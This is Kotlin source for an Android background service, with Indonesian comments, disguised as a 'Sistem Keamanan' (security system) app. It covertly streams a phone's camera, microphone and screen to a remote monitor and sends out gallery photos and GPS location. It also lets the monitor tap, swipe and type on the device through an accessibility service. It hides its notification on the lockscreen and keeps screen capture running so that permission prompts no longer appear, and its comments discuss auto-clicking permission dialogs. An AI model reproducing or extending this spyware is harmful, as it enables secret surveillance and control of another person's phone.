package com.mwahh.cam

import android.Manifest
import android.app.AlarmManager
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import androidx.core.content.ContextCompat
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.*
import org.webrtc.audio.JavaAudioDeviceModule
import java.util.concurrent.TimeUnit
import android.hardware.display.DisplayManager
import android.media.projection.MediaProjection
import android.util.DisplayMetrics
import android.view.WindowManager

// Dua keadaan:
// - AKTIF  : tersambung ke server, menunggu perintah dari monitor (wake lock aktif).
// - TIDUR  : diputus dari monitor. Tidak ada koneksi dan tidak ada wake lock;
//            hanya mengecek status ke server tiap beberapa menit untuk tahu kapan harus bangun.
class CameraService : Service() {

    companion object {
        const val ACTION_POLL = "com.mwahh.cam.POLL"
        const val POLL_MS = 5 * 60 * 1000L
    }

    private val main = Handler(Looper.getMainLooper())
    private var sig: Signaling? = null
    private var wake: PowerManager.WakeLock? = null
    private var sleeping = false

    private var egl: EglBase? = null
    private var factory: PeerConnectionFactory? = null
    private var pc: PeerConnection? = null
    private var capturer: VideoCapturer? = null
    private var helper: SurfaceTextureHelper? = null
    private var videoSource: VideoSource? = null
    private var audioSource: AudioSource? = null
    private var videoTrack: VideoTrack? = null
    private var audioTrack: AudioTrack? = null

    private var front = false
    private var streaming = false
    private var kind = "cam" // "cam" | "screen" | "control"
    private var quality = "mid" // "low" | "mid" | "high"
    private var screenWake: PowerManager.WakeLock? = null
    private val ice = IceQueue()

    // --- Pantau Layar: disiapkan SEKALI dan dibiarkan jalan terus di background,
    // seperti kamera. Alasannya: izin tangkap-layar dari Android itu sekali pakai per sesi,
    // jadi kalau kita matikan-nyalakan ulang tiap buka/tutup Pantau Layar, dialog izinnya akan
    // muncul lagi setiap saat. Dengan dibiarkan jalan terus, dialog itu hanya perlu muncul
    // sekali (saat Pasang / pertama kali dipakai), setelah itu Pantau Layar bisa dibuka kapan
    // saja tanpa gangguan apa pun di layar HP kedua -- persis seperti kamera.
    private var screenReady = false
    private var screenEgl: EglBase? = null
    private var screenFactory: PeerConnectionFactory? = null
    private var screenCapturer: VideoCapturer? = null
    private var screenHelper: SurfaceTextureHelper? = null
    private var screenSource: VideoSource? = null
    private var screenTrack: VideoTrack? = null
    private var screenAudioSource: AudioSource? = null
    private var screenAudioTrack: AudioTrack? = null
    private var screenW = 0
    private var screenH = 0

    private val batteryTick = object : Runnable {
        override fun run() {
            sendBattery()
            main.postDelayed(this, 300000)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                val ch = NotificationChannel("sk", "Sistem Keamanan", NotificationManager.IMPORTANCE_LOW)
                ch.setShowBadge(false)
                ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
                nm.createNotificationChannel(ch)
            }
            val n = NotificationCompat.Builder(this, "sk")
                .setContentTitle("Sistem Keamanan")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
            // Tiap jenis foreground service baru dikenal Android mulai versi tertentu.
            // Bug sebelumnya: semuanya digabung di bawah satu syarat SDK>=30, jadi di
            // Android 10 (SDK 29) tipe mediaProjection tidak pernah terpasang -> screen
            // capture selalu gagal dengan pesan "Media projections require a foreground
            // service of type...". Sekarang tiap tipe dicek sesuai SDK minimumnya sendiri.
            var type = 0
            if (Build.VERSION.SDK_INT >= 30) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                if (hasLocationPerm()) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (Build.VERSION.SDK_INT >= 29) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
            ServiceCompat.startForeground(this, 1, n, type)
        } catch (e: Exception) {
            Log.e("sk", "startForeground gagal", e)
            stopSelf()
            return
        }
        activate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_POLL) doPoll()
        return START_STICKY
    }

    override fun onDestroy() {
        stopStreaming()
        releasePersistentScreenCapture()
        sig?.stop()
        sig = null
        cancelPoll()
        main.removeCallbacksAndMessages(null)
        try { if (wake?.isHeld == true) wake?.release() } catch (e: Exception) {}
        super.onDestroy()
    }

    // Dipanggil hanya saat layanan ini benar-benar dimatikan (bukan sekadar menutup sesi
    // menonton) -- bagian persisten Pantau Layar memang sengaja dibiarkan jalan selama
    // layanannya hidup, lihat catatan di stopStreaming().
    private fun releasePersistentScreenCapture() {
        screenReady = false
        try { screenCapturer?.stopCapture() } catch (e: Exception) {}
        try { screenCapturer?.dispose() } catch (e: Exception) {}
        screenCapturer = null
        try { screenTrack?.dispose() } catch (e: Exception) {}
        try { screenAudioTrack?.dispose() } catch (e: Exception) {}
        try { screenSource?.dispose() } catch (e: Exception) {}
        try { screenAudioSource?.dispose() } catch (e: Exception) {}
        try { screenHelper?.dispose() } catch (e: Exception) {}
        try { screenFactory?.dispose() } catch (e: Exception) {}
        try { screenEgl?.release() } catch (e: Exception) {}
        screenTrack = null
        screenAudioTrack = null
        screenSource = null
        screenAudioSource = null
        screenHelper = null
        screenFactory = null
        screenEgl = null
    }

    // ---------- AKTIF / TIDUR ----------

    private fun activate() {
        sleeping = false
        cancelPoll()
        if (wake?.isHeld != true) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wake = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sk:service")
            wake?.acquire()
        }
        sig?.stop()
        sig = Signaling(this, "camera", { onMsg(it) }, { online ->
            if (online) {
                sendInfo()
                sendBattery()
                sendState()
            }
        })
        sig?.start()
        main.removeCallbacks(batteryTick)
        main.postDelayed(batteryTick, 300000)
    }

    private fun goSleep() {
        stopStreaming()
        sig?.stop()
        sig = null
        main.removeCallbacks(batteryTick)
        try { if (wake?.isHeld == true) wake?.release() } catch (e: Exception) {}
        sleeping = true
        schedulePoll()
    }

    private fun pollIntent(): PendingIntent {
        val i = Intent(this, CameraService::class.java).setAction(ACTION_POLL)
        return PendingIntent.getService(
            this, 0, i, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
    }

    private fun schedulePoll() {
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.setAndAllowWhileIdle(
            AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + POLL_MS, pollIntent()
        )
    }

    private fun cancelPoll() {
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.cancel(pollIntent())
    }

    private fun doPoll() {
        if (!sleeping) return
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        val w = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sk:poll")
        w.acquire(20000)
        Thread {
            val on = checkOn()
            main.post {
                if (sleeping) {
                    if (on == true) activate() else schedulePoll()
                }
                try { if (w.isHeld) w.release() } catch (e: Exception) {}
            }
        }.start()
    }

    private fun checkOn(): Boolean? {
        return try {
            val client = OkHttpClient.Builder().callTimeout(10, TimeUnit.SECONDS).build()
            val req = Request.Builder().url(Cfg.statusUrl(this)).build()
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) null
                else JSONObject(r.body!!.string()).optBoolean("on", true)
            }
        } catch (e: Exception) {
            null
        }
    }

    // ---------- PESAN DARI MONITOR ----------

    private fun onMsg(j: JSONObject) {
        when (j.optString("type")) {
            "power" -> {
                if (!j.optBoolean("on", true)) stopStreaming() // tetap tersambung, jadi "Mulai" langsung bisa dipakai
            }
            "peer" -> {
                // Monitor baru masuk atau keluar: sesi lama tidak berlaku lagi.
                if (streaming) stopStreaming()
                if (j.optBoolean("online")) {
                    sendBattery()
                    sendState()
                }
            }
            "cmd" -> when (j.optString("action")) {
                "start" -> startStreaming(
                    Rtc.toIceServers(j.optJSONArray("ice")),
                    j.optString("kind", "cam"),
                    j.optString("quality", "mid")
                )
                "stop" -> stopStreaming()
                "switch" -> switchCam()
                "locate" -> locate()
            }
            "input" -> handleInput(j)
            "gallery" -> handleGallery(j)
            "answer" -> {
                val p = pc ?: return
                p.setRemoteDescription(object : Rtc.Sdp() {
                    override fun onSetSuccess() {
                        main.post { if (pc === p) ice.flush(p) }
                    }
                }, SessionDescription(SessionDescription.Type.ANSWER, j.getString("sdp")))
            }
            "ice" -> {
                try { ice.add(pc, Rtc.jsonToIce(j)) } catch (e: Exception) {}
            }
        }
    }

    // ---------- KAMERA ----------

    private fun startStreaming(servers: List<PeerConnection.IceServer>, streamKind: String, streamQuality: String) {
        if (streaming) return
        kind = streamKind
        quality = streamQuality
        if (streamKind == "cam") {
            try {
                begin(servers)
            } catch (e: Exception) {
                Log.e("sk", "gagal menyalakan kamera", e)
                sendError("Gagal: ${e.message}")
                stopStreaming()
            }
            return
        }
        ensureScreenReady { ok ->
            if (!ok) return@ensureScreenReady
            try {
                buildScreenSession(servers)
            } catch (e: Exception) {
                Log.e("sk", "gagal menyalakan layar", e)
                sendError("Gagal: ${e.message}")
                stopStreaming()
            }
        }
    }

    // Menyiapkan jalur tangkap-layar SEKALI saja (kalau belum pernah/izin kedaluwarsa),
    // lalu memanggil onReady. Dipanggil ulang tiap kali Pantau Layar dibuka, tapi hanya
    // benar-benar membangun ulang pipeline-nya kalau screenReady masih false.
    private fun ensureScreenReady(onReady: (Boolean) -> Unit) {
        if (screenReady) {
            onReady(true)
            return
        }
        if (ScreenHolder.available()) {
            try {
                setupPersistentScreenCapture()
                onReady(true)
            } catch (e: Exception) {
                Log.e("sk", "gagal menyiapkan tangkap layar", e)
                sendError("Gagal menyiapkan layar: ${e.message}")
                onReady(false)
            }
            return
        }
        autoRenewScreenGrant(onReady, 0)
    }

    private fun autoRenewScreenGrant(onReady: (Boolean) -> Unit, elapsedMs: Int) {
        if (elapsedMs == 0) {
            val i = Intent(this, ScreenGrantActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try {
                startActivity(i)
            } catch (e: Exception) {
                sendError("Tidak bisa membuka dialog izin layar secara otomatis: ${e.message}")
                onReady(false)
                return
            }
        }
        if (ScreenHolder.available()) {
            ensureScreenReady(onReady)
            return
        }
        if (elapsedMs >= 8000) {
            sendError(
                "Izin layar di HP kedua belum/tidak bisa diberikan otomatis " +
                    "(mungkin HP ini membatasi dialog izin sensitif supaya tidak bisa diklik otomatis). " +
                    "Buka aplikasi Sistem Keamanan sekali secara langsung di HP kedua untuk menyetujuinya manual."
            )
            onReady(false)
            return
        }
        main.postDelayed({ autoRenewScreenGrant(onReady, elapsedMs + 400) }, 400)
    }

    private fun sendError(msg: String) {
        sig?.send(JSONObject().put("type", "error").put("message", msg))
    }

    private fun camResFor(q: String): Triple<Int, Int, Int> = when (q) {
        "low" -> Triple(640, 480, 15)
        "high" -> Triple(1920, 1080, 24)
        else -> Triple(1280, 720, 20)
    }

    private fun bitrateFor(q: String, isCam: Boolean): Int = when (q) {
        "low" -> if (isCam) 800_000 else 1_500_000
        "high" -> if (isCam) 4_000_000 else 6_000_000
        else -> if (isCam) 2_500_000 else 4_000_000
    }

    private fun screenCapFor(q: String): Int = when (q) {
        "low" -> 960
        "high" -> 2200
        else -> 1600
    }

    private fun screenFpsFor(q: String): Int = when (q) {
        "low" -> 8
        "high" -> 20
        else -> 15
    }

    // Kamera: setiap sesi dibuat dan dibongkar ulang dari nol (tidak masalah, kamera tidak
    // punya batasan "izin sekali pakai" seperti tangkap-layar).
    private fun begin(servers: List<PeerConnection.IceServer>) {
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(applicationContext)
                .createInitializationOptions()
        )
        val eglBase = EglBase.create()
        egl = eglBase
        val adm = JavaAudioDeviceModule.builder(this).createAudioDeviceModule()
        val f = PeerConnectionFactory.builder()
            .setAudioDeviceModule(adm)
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, true))
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase.eglBaseContext))
            .createPeerConnectionFactory()
        adm.release()
        factory = f

        helper = SurfaceTextureHelper.create("capture", eglBase.eglBaseContext)
        val enumerator = Camera2Enumerator(this)
        val names = enumerator.deviceNames
        val name = names.firstOrNull { if (front) enumerator.isFrontFacing(it) else enumerator.isBackFacing(it) }
            ?: names.firstOrNull()
            ?: throw IllegalStateException("kamera tidak ditemukan")
        val cap = enumerator.createCapturer(name, null)
        capturer = cap
        front = enumerator.isFrontFacing(name)
        val (w, h, fps) = camResFor(quality)
        val vs = f.createVideoSource(false)
        videoSource = vs
        cap.initialize(helper, this, vs.capturerObserver)
        cap.startCapture(w, h, fps)
        val vt = f.createVideoTrack("v0", vs)
        videoTrack = vt

        val asrc = f.createAudioSource(MediaConstraints())
        audioSource = asrc
        val at = f.createAudioTrack("a0", asrc)
        audioTrack = at

        val cfg = PeerConnection.RTCConfiguration(servers)
        cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        val p = f.createPeerConnection(cfg, object : Rtc.PcObserver() {
            override fun onIceCandidate(c: IceCandidate?) {
                if (c != null) main.post { sig?.send(Rtc.iceToJson(c)) }
            }

            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {
                if (s == PeerConnection.IceConnectionState.FAILED) main.post { stopStreaming() }
            }
        }) ?: throw IllegalStateException("peer connection gagal dibuat")
        pc = p
        ice.reset()
        p.addTrack(vt, listOf("s0"))
        p.addTrack(at, listOf("s0"))
        applyBitrate(p, true)

        streaming = true
        p.createOffer(object : Rtc.Sdp() {
            override fun onCreateSuccess(d: SessionDescription?) {
                if (d == null) return
                p.setLocalDescription(Rtc.Sdp(), d)
                main.post { sig?.send(JSONObject().put("type", "offer").put("sdp", d.description)) }
            }
        }, MediaConstraints())
        sendState()
    }

    // Disiapkan SEKALI saja (lihat catatan di deklarasi field screen* di atas), lalu
    // dipakai berkali-kali oleh buildScreenSession() tanpa pernah dibongkar.
    private fun setupPersistentScreenCapture() {
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(applicationContext)
                .createInitializationOptions()
        )
        val eglBase = EglBase.create()
        screenEgl = eglBase
        val adm = JavaAudioDeviceModule.builder(this).createAudioDeviceModule()
        val f = PeerConnectionFactory.builder()
            .setAudioDeviceModule(adm)
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, true))
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase.eglBaseContext))
            .createPeerConnectionFactory()
        adm.release()
        screenFactory = f

        val dm = DisplayMetrics()
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)
        var w = dm.widthPixels
        var h = dm.heightPixels
        val capLimit = screenCapFor(quality)
        if (maxOf(w, h) > capLimit) {
            val scale = maxOf(w, h).toFloat() / capLimit.toFloat()
            w = ((w / scale).toInt() / 2) * 2
            h = ((h / scale).toInt() / 2) * 2
        }
        screenW = w
        screenH = h
        val fps = screenFpsFor(quality)

        val data = ScreenHolder.data ?: throw IllegalStateException("izin layar belum diberikan")
        val helperS = SurfaceTextureHelper.create("screen-capture", eglBase.eglBaseContext)
        screenHelper = helperS
        val cap = ScreenCapturerAndroid(data, object : MediaProjection.Callback() {
            override fun onStop() {
                // Sistem mencabut izinnya sendiri (jarang, biasanya cuma gara-gara reboot
                // atau kebijakan OS). Reset supaya percobaan berikutnya minta izin baru lagi.
                main.post {
                    screenReady = false
                    ScreenHolder.clear()
                    if (streaming && kind != "cam") stopStreaming()
                }
            }
        })
        screenCapturer = cap
        val vs = f.createVideoSource(true)
        screenSource = vs
        cap.initialize(helperS, this, vs.capturerObserver)
        cap.startCapture(w, h, fps)
        screenTrack = f.createVideoTrack("screen_v0", vs)

        val asrc = f.createAudioSource(MediaConstraints())
        screenAudioSource = asrc
        screenAudioTrack = f.createAudioTrack("screen_a0", asrc)

        screenReady = true
    }

    // Satu sesi "menonton" Pantau Layar: hanya membuat koneksi (PeerConnection) baru yang
    // menumpang video/audio yang SUDAH berjalan dari setupPersistentScreenCapture().
    private fun buildScreenSession(servers: List<PeerConnection.IceServer>) {
        val f = screenFactory ?: throw IllegalStateException("layar belum siap")
        val vt = screenTrack ?: throw IllegalStateException("layar belum siap")
        val at = screenAudioTrack ?: throw IllegalStateException("layar belum siap")

        // Layar perlu benar-benar menyala supaya konten yang ditangkap tidak beku/gelap.
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        @Suppress("DEPRECATION")
        screenWake = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
            "sk:screen"
        )
        screenWake?.acquire(30 * 60 * 1000L)

        val cfg = PeerConnection.RTCConfiguration(servers)
        cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        val p = f.createPeerConnection(cfg, object : Rtc.PcObserver() {
            override fun onIceCandidate(c: IceCandidate?) {
                if (c != null) main.post { sig?.send(Rtc.iceToJson(c)) }
            }

            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {
                if (s == PeerConnection.IceConnectionState.FAILED) main.post { stopStreaming() }
            }
        }) ?: throw IllegalStateException("peer connection gagal dibuat")
        pc = p
        ice.reset()
        p.addTrack(vt, listOf("s0"))
        p.addTrack(at, listOf("s0"))
        applyBitrate(p, false)

        streaming = true
        sendDims(screenW, screenH)
        p.createOffer(object : Rtc.Sdp() {
            override fun onCreateSuccess(d: SessionDescription?) {
                if (d == null) return
                p.setLocalDescription(Rtc.Sdp(), d)
                main.post { sig?.send(JSONObject().put("type", "offer").put("sdp", d.description)) }
            }
        }, MediaConstraints())
        sendState()
    }

    // Bitrate eksplisit: tanpa ini WebRTC kadang mulai dari bitrate rendah dan naik pelan-pelan
    // (terlihat buram di awal). Layar (teks lebih detail) diberi jatah lebih besar dari kamera.
    private fun applyBitrate(p: PeerConnection, isCam: Boolean) {
        val targetBitrate = bitrateFor(quality, isCam)
        for (sender in p.senders) {
            val track = sender.track()
            if (track is VideoTrack) {
                val params = sender.parameters
                if (params.encodings.isNotEmpty()) {
                    params.encodings[0].maxBitrateBps = targetBitrate
                    params.encodings[0].minBitrateBps = targetBitrate / 4
                    sender.parameters = params
                }
            }
        }
    }

    private fun stopStreaming() {
        streaming = false
        try { if (screenWake?.isHeld == true) screenWake?.release() } catch (e: Exception) {}
        screenWake = null
        if (kind == "cam") {
            try { capturer?.stopCapture() } catch (e: Exception) {}
            try { capturer?.dispose() } catch (e: Exception) {}
            capturer = null
            try { pc?.close() } catch (e: Exception) {}
            try { pc?.dispose() } catch (e: Exception) {}
            pc = null
            try { videoTrack?.dispose() } catch (e: Exception) {}
            try { audioTrack?.dispose() } catch (e: Exception) {}
            try { videoSource?.dispose() } catch (e: Exception) {}
            try { audioSource?.dispose() } catch (e: Exception) {}
            try { helper?.dispose() } catch (e: Exception) {}
            try { factory?.dispose() } catch (e: Exception) {}
            try { egl?.release() } catch (e: Exception) {}
            videoTrack = null
            audioTrack = null
            videoSource = null
            audioSource = null
            helper = null
            factory = null
            egl = null
        } else {
            // Mode layar: HANYA sesi "menonton" (PeerConnection) ini yang ditutup. Penangkapan
            // layarnya sendiri (screenCapturer/screenTrack/dst.) sengaja DIBIARKAN tetap jalan
            // di background -- itulah intinya, supaya Pantau Layar bisa dibuka lagi kapan saja
            // tanpa Android menampilkan dialog izin lagi.
            try { pc?.close() } catch (e: Exception) {}
            try { pc?.dispose() } catch (e: Exception) {}
            pc = null
        }
        ice.reset()
        sendState()
    }

    private fun switchCam() {
        if (kind != "cam") return
        val c = capturer as? CameraVideoCapturer
        if (c != null) {
            c.switchCamera(object : CameraVideoCapturer.CameraSwitchHandler {
                override fun onCameraSwitchDone(isFront: Boolean) {
                    front = isFront
                    main.post { sendState() }
                }

                override fun onCameraSwitchError(e: String?) {}
            })
        } else {
            front = !front
            sendState()
        }
    }

    // ---------- INFO PERANGKAT & LOKASI ----------

    // ---------- GALERI ----------
    // Daftar 200 foto terbaru dari galeri Android (MediaStore), lalu foto penuh dikirim
    // sebagai JPEG terkompres, dipotong-potong jadi beberapa pesan (base64) supaya tidak
    // kebentur batas ukuran satu pesan WebSocket.

    private fun handleGallery(j: JSONObject) {
        when (j.optString("action")) {
            "list" -> Thread { galleryList() }.start()
            "full" -> Thread { galleryImage(j.optLong("id")) }.start()
        }
    }

    private fun galleryList() {
        val items = JSONArray()
        try {
            val proj = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.DATE_ADDED
            )
            val sort = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 200"
            contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, sort
            )?.use { c ->
                val idCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                val dateCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
                while (c.moveToNext()) {
                    items.put(
                        JSONObject()
                            .put("id", c.getLong(idCol))
                            .put("name", c.getString(nameCol) ?: "")
                            .put("date", c.getLong(dateCol))
                    )
                }
            }
        } catch (e: Exception) {
            Log.e("sk", "gagal membaca galeri", e)
        }
        main.post { sig?.send(JSONObject().put("type", "gallery_list").put("items", items)) }
    }

    private fun galleryImage(id: Long) {
        try {
            val uri = android.content.ContentUris.withAppendedId(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
            )
            val bmp: android.graphics.Bitmap? =
                contentResolver.openInputStream(uri)?.use { android.graphics.BitmapFactory.decodeStream(it) }
            if (bmp == null) {
                main.post {
                    sig?.send(JSONObject().put("type", "gallery_error").put("id", id).put("message", "Gagal membaca foto"))
                }
                return
            }
            // Batasi sisi terpanjang supaya transfer tidak terlalu besar/lambat lewat data seluler.
            var toSend = bmp
            val maxSide = 1600
            val w = bmp.width
            val h = bmp.height
            if (maxOf(w, h) > maxSide) {
                val scale = maxSide.toFloat() / maxOf(w, h)
                toSend = android.graphics.Bitmap.createScaledBitmap(bmp, (w * scale).toInt(), (h * scale).toInt(), true)
            }
            val out = java.io.ByteArrayOutputStream()
            toSend.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
            val b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)

            val chunkSize = 150_000
            val total = ((b64.length + chunkSize - 1) / chunkSize).coerceAtLeast(1)
            var seq = 0
            var idx = 0
            while (idx < b64.length || (idx == 0 && b64.isEmpty())) {
                val end = minOf(idx + chunkSize, b64.length)
                val piece = b64.substring(idx, end)
                val msg = JSONObject()
                    .put("type", "gallery_chunk")
                    .put("id", id)
                    .put("seq", seq)
                    .put("total", total)
                    .put("data", piece)
                main.post { sig?.send(msg) }
                seq++
                idx = end
                if (idx >= b64.length) break
            }
        } catch (e: Exception) {
            Log.e("sk", "gagal ambil foto", e)
            main.post {
                sig?.send(JSONObject().put("type", "gallery_error").put("id", id).put("message", "Gagal: ${e.message}"))
            }
        }
    }

    private fun sendInfo() {
        val maker = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        sig?.send(
            JSONObject().put("type", "info")
                .put("model", "$maker ${Build.MODEL}")
                .put("android", Build.VERSION.RELEASE)
        )
    }

    private fun hasLocationPerm(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun sendLocError(msg: String) {
        sig?.send(JSONObject().put("type", "loc").put("error", msg))
    }

    private fun sendLoc(l: Location, stale: Boolean) {
        sig?.send(
            JSONObject().put("type", "loc")
                .put("lat", l.latitude)
                .put("lng", l.longitude)
                .put("acc", l.accuracy.toDouble())
                .put("stale", stale)
        )
    }

    private var locating = false

    private fun locate() {
        if (locating) return
        if (!hasLocationPerm()) {
            sendLocError("izin lokasi belum diberikan di HP kedua")
            return
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER).filter {
            try { lm.isProviderEnabled(it) } catch (e: Exception) { false }
        }
        if (providers.isEmpty()) {
            sendLocError("layanan lokasi di HP kedua mati")
            return
        }
        locating = true
        var done = false
        val listener = object : LocationListener {
            override fun onLocationChanged(l: Location) {
                if (done) return
                done = true
                locating = false
                try { lm.removeUpdates(this) } catch (e: Exception) {}
                sendLoc(l, false)
            }

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}

            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }
        try {
            for (p in providers) lm.requestLocationUpdates(p, 0L, 0f, listener, Looper.getMainLooper())
        } catch (e: Exception) {
            locating = false
            sendLocError("gagal membaca lokasi")
            return
        }
        main.postDelayed({
            if (!done) {
                done = true
                locating = false
                try { lm.removeUpdates(listener) } catch (e: Exception) {}
                var last: Location? = null
                for (p in providers) {
                    val c = try { lm.getLastKnownLocation(p) } catch (e: Exception) { null }
                    if (c != null && (last == null || c.time > last.time)) last = c
                }
                if (last != null) sendLoc(last, true) else sendLocError("lokasi belum didapat")
            }
        }, 25000)
    }

    private fun sendState() {
        // Catatan: w/h SENGAJA tidak dikirim di sini. sendState() dipanggil dari beberapa
        // titik (peer online/offline, mulai, berhenti, ganti kamera) -- kalau dimensi layar
        // disertakan di sini, panggilan yang terlambat/beda urutan bisa menimpa nilai yang
        // benar dengan 0, bikin sentuhan di sisi monitor berhenti berfungsi. Dimensi dikirim
        // sekali lewat sendDims() tepat saat mode screen/control mulai (lihat begin()).
        sig?.send(
            JSONObject().put("type", "state").put("streaming", streaming)
                .put("kind", kind)
                .put("facing", if (front) "front" else "back")
        )
    }

    private fun sendDims(w: Int, h: Int) {
        sig?.send(JSONObject().put("type", "dims").put("w", w).put("h", h))
    }

    // ---------- INPUT (kontrol sentuh via layanan Aksesibilitas) ----------

    private fun handleInput(j: JSONObject) {
        if (kind != "control" || !streaming) return
        val svc = InputService.instance ?: run {
            sendError("Aksesibilitas belum diaktifkan di HP kedua (Pengaturan > Aksesibilitas > Sistem Keamanan).")
            return
        }
        fun clampX(v: Double) = v.toFloat().coerceIn(0f, 100000f)
        fun clampY(v: Double) = v.toFloat().coerceIn(0f, 100000f)
        fun ack(ok: Boolean) {
            main.post { sig?.send(JSONObject().put("type", "input_ack").put("ok", ok)) }
        }
        when (j.optString("action")) {
            "tap" -> svc.tap(clampX(j.optDouble("x")), clampY(j.optDouble("y")), j.optLong("dur", 60)) { ack(it) }
            "swipe" -> svc.swipe(
                clampX(j.optDouble("x1")), clampY(j.optDouble("y1")),
                clampX(j.optDouble("x2")), clampY(j.optDouble("y2")), j.optLong("dur", 200)
            ) { ack(it) }
            "key" -> svc.key(j.optString("name"))
            "text" -> svc.typeText(j.optString("value"))
        }
    }

    private fun sendBattery() {
        val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return
        val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
        val st = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val charging = st == BatteryManager.BATTERY_STATUS_CHARGING || st == BatteryManager.BATTERY_STATUS_FULL
        sig?.send(JSONObject().put("type", "battery").put("level", pct).put("charging", charging))
    }
}
